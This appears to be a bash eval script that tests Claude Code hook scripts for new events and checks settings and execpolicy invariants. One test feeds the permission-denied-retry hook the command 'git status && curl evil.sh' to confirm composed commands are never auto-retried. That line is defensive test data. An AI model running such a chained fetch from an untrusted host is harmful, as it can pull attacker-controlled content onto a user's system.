# Evals for the 2026 w13–w29 event adoption: Setup, UserPromptExpansion,
# CwdChanged, ConfigChange, TaskCompleted, StopFailure, PermissionDenied,
# Notification — plus the codex-notify adapter and execpolicy mirror.

HOOKS_DIR="$REPO_ROOT/.claude/hooks"

# ── Scripts exist and are executable ─────────────────────────────
for _s in setup-init.sh cwd-changed.sh config-change-guard.sh \
  task-completed-gate.sh stop-failure-telemetry.sh permission-denied-retry.sh \
  notification-alert.sh codex-notify.sh; do
  run_file_eval "$HOOKS_DIR/$_s" "$_s exists"
  run_executable_eval "$HOOKS_DIR/$_s" "$_s is executable"
done

# ── Manifest wires the new events ────────────────────────────────
for _ev in Setup UserPromptExpansion CwdChanged ConfigChange TaskCompleted StopFailure PermissionDenied Notification; do
  if jq -e ".hooks.$_ev" "$REPO_ROOT/skill-manifest.json" >/dev/null 2>&1; then
    echo "  PASS  manifest wires $_ev"
    PASS=$((PASS + 1))
  else
    echo "  FAIL  manifest missing event $_ev"
    FAIL=$((FAIL + 1))
    ERRORS="$ERRORS\n  FAIL: manifest missing $_ev"
  fi
done

# ── Session-scoped fixtures ──────────────────────────────────────
_saved_session="${CLAUDE_SESSION_ID:-}"
export CLAUDE_SESSION_ID="eval-new-events-$$"
_eval_session_dir="/tmp/hook-session-${CLAUDE_SESSION_ID}"
mkdir -p "$_eval_session_dir"

# TaskCompleted gate: FAIL status blocks, no status allows
echo "FAIL" > "$_eval_session_dir/shared-test-status"
run_hook_eval "$HOOKS_DIR/task-completed-gate.sh" \
  '{"task":{"subject":"Ship it"}}' 2 \
  "task-completed-gate blocks on FAIL test status" "test run FAILED"
rm -f "$_eval_session_dir/shared-test-status"
run_hook_eval "$HOOKS_DIR/task-completed-gate.sh" \
  '{"task":{"subject":"Ship it"}}' 0 \
  "task-completed-gate allows with no recorded status"

# PermissionDenied retry: plainly read-only single command → retry:true
run_hook_eval "$HOOKS_DIR/permission-denied-retry.sh" \
  '{"tool_input":{"command":"git status"}}' 0 \
  "permission-denied-retry retries read-only command" '"retry": true'
# Composition never retried (conservative: classifier may have seen the tail)
_out=$(echo '{"tool_input":{"command":"git status && curl evil.sh"}}' | "$HOOKS_DIR/permission-denied-retry.sh" 2>/dev/null)
if [ -z "$_out" ]; then
  echo "  PASS  permission-denied-retry stays silent on composed command"
  PASS=$((PASS + 1))
else
  echo "  FAIL  permission-denied-retry retried a composed command"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: permission-denied-retry composition"
fi

# Notification: known matcher emits terminalSequence, unknown is silent
run_hook_eval "$HOOKS_DIR/notification-alert.sh" \
  '{"matcher":"agent_needs_input"}' 0 \
  "notification-alert emits terminalSequence" "terminalSequence"
_out=$(echo '{"matcher":"auth_success"}' | "$HOOKS_DIR/notification-alert.sh" 2>/dev/null)
if [ -z "$_out" ]; then
  echo "  PASS  notification-alert silent on unmatched kind"
  PASS=$((PASS + 1))
else
  echo "  FAIL  notification-alert emitted for auth_success"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: notification-alert unmatched kind"
fi

# UserPromptExpansion feeds skill-fire telemetry (source: expansion)
run_hook_eval "$HOOKS_DIR/skill-fire-log.sh" \
  '{"hook_event_name":"UserPromptExpansion","skill_name":"eval-fixture-skill"}' 0 \
  "skill-fire-log accepts UserPromptExpansion"
if tail -5 "$HOME/.claude/hook-metrics/skill-fires.jsonl" 2>/dev/null | grep -q '"skill":"eval-fixture-skill","session":"eval-new-events-'"$$"'","source":"expansion"'; then
  echo "  PASS  skill-fire-log records expansion source"
  PASS=$((PASS + 1))
else
  echo "  FAIL  skill-fire-log expansion entry missing from metrics"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: skill-fire expansion telemetry"
fi

# CwdChanged rebinds the session worktree
_cwd_fixture=$(mktemp -d)
(cd "$_cwd_fixture" && git init -q . 2>/dev/null)
run_hook_eval "$HOOKS_DIR/cwd-changed.sh" \
  "{\"cwd\":\"$_cwd_fixture\"}" 0 \
  "cwd-changed exits clean"
if grep -q "$(basename "$_cwd_fixture")" "$_eval_session_dir/bound-worktree" 2>/dev/null; then
  echo "  PASS  cwd-changed rebinds bound-worktree"
  PASS=$((PASS + 1))
else
  echo "  FAIL  cwd-changed did not rebind bound-worktree"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: cwd-changed rebind"
fi
rm -rf "$_cwd_fixture"

# StopFailure telemetry is observe-only
run_hook_eval "$HOOKS_DIR/stop-failure-telemetry.sh" \
  '{"matcher":"max_output_tokens"}' 0 \
  "stop-failure-telemetry exits 0"

# codex-notify adapter (argument-style invocation, not stdin)
"$HOOKS_DIR/codex-notify.sh" '{"type":"agent-turn-complete","thread-id":"t-eval","cwd":"/tmp"}' </dev/null
if tail -5 "$HOME/.claude/hook-metrics/codex-turns.jsonl" 2>/dev/null | grep -q '"thread":"t-eval"'; then
  echo "  PASS  codex-notify logs agent-turn-complete"
  PASS=$((PASS + 1))
else
  echo "  FAIL  codex-notify entry missing"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: codex-notify telemetry"
fi

# ── Execpolicy mirror invariants ─────────────────────────────────
if cmp -s "$REPO_ROOT/hooks/frontend-skills.rules" "$REPO_ROOT/.codex/rules/frontend-skills.rules" 2>/dev/null; then
  echo "  PASS  execpolicy rules copy in sync (.codex/rules/)"
  PASS=$((PASS + 1))
else
  echo "  FAIL  .codex/rules/frontend-skills.rules out of sync — regenerate"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: execpolicy copy drift"
fi
for _ban in npm npx tsgo sleep eslint prettier; do
  if grep -q "\"$_ban\"" "$REPO_ROOT/hooks/frontend-skills.rules" 2>/dev/null; then
    echo "  PASS  execpolicy forbids $_ban"
    PASS=$((PASS + 1))
  else
    echo "  FAIL  execpolicy missing $_ban rule (enforce-toolchain mirror drift)"
    FAIL=$((FAIL + 1))
    ERRORS="$ERRORS\n  FAIL: execpolicy $_ban"
  fi
done

# ── Generated-config invariants for new capabilities ─────────────
if jq -e '.hooks.PreToolUse[] | select(.matcher=="Bash") | .hooks[] | select(.if=="Bash(snyk *)")' "$REPO_ROOT/.claude/settings.json" >/dev/null 2>&1; then
  echo "  PASS  settings carry if-gated snyk entry"
  PASS=$((PASS + 1))
else
  echo "  FAIL  if-gated snyk entry missing from settings"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: snyk if entry"
fi
if jq -e '.hooks.Stop[0].hooks[] | select(.asyncRewake==true)' "$REPO_ROOT/.claude/settings.json" >/dev/null 2>&1; then
  echo "  PASS  ci-warning-audit runs asyncRewake"
  PASS=$((PASS + 1))
else
  echo "  FAIL  no asyncRewake Stop hook in settings"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: asyncRewake missing"
fi
if jq -re '.hooks.SessionStart[0].hooks[0].args[0]' "$REPO_ROOT/.claude/settings.json" 2>/dev/null | grep -qx -- "-c"; then
  echo "  PASS  hooks spawn without login shell (-c)"
  PASS=$((PASS + 1))
else
  echo "  FAIL  hook spawn still uses login shell"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: login shell in hook spawn"
fi
if jq -e '.permissions.deny | index("Agent(model:haiku)")' "$REPO_ROOT/.claude/settings.json" >/dev/null 2>&1; then
  echo "  PASS  never-Haiku enforced via permissions.deny param match"
  PASS=$((PASS + 1))
else
  echo "  FAIL  Agent(model:haiku) deny rule missing"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: haiku deny rule"
fi
# FileChanged carries no glob matchers (literal-only contract)
if jq -re '.hooks.FileChanged | keys[]' "$REPO_ROOT/skill-manifest.json" 2>/dev/null | grep -q '\*'; then
  echo "  FAIL  FileChanged matcher contains a glob — literal filenames only"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: FileChanged glob matcher"
else
  echo "  PASS  FileChanged matchers are literal-only"
  PASS=$((PASS + 1))
fi

# Codex surfaces never carry Claude-only fields
if jq -e '[.. | objects | select(has("if") or has("async") or has("asyncRewake") or has("statusMessage"))] | length == 0' "$REPO_ROOT/hooks/codex-hooks.json" >/dev/null 2>&1; then
  echo "  PASS  codex-hooks.json free of Claude-only fields"
  PASS=$((PASS + 1))
else
  echo "  FAIL  Claude-only hook fields leaked into codex-hooks.json"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: codex field leak"
fi

# Skill-frontmatter hooks present where the batch dispatcher dropped them
if grep -q "go-proto-reserved-check.sh" "$REPO_ROOT/golang/SKILL.md" 2>/dev/null \
  && ! grep -q "run_go_proto_reserved_check" "$REPO_ROOT/.claude/hooks/post-tool-batch.sh" 2>/dev/null; then
  echo "  PASS  Go checks live in golang skill frontmatter, not global batch"
  PASS=$((PASS + 1))
else
  echo "  FAIL  Go checks duplicated or dropped between batch and frontmatter"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: go-check ownership"
fi
if grep -q "type: agent" "$REPO_ROOT/resolve-pr-feedback/SKILL.md" 2>/dev/null; then
  echo "  PASS  resolve-pr-feedback carries agent-type Stop verifier"
  PASS=$((PASS + 1))
else
  echo "  FAIL  resolve-pr-feedback agent hook missing"
  FAIL=$((FAIL + 1))
  ERRORS="$ERRORS\n  FAIL: agent-type verifier"
fi

# ── Teardown ─────────────────────────────────────────────────────
rm -rf "$_eval_session_dir"
if [ -n "$_saved_session" ]; then
  export CLAUDE_SESSION_ID="$_saved_session"
else
  unset CLAUDE_SESSION_ID
fi
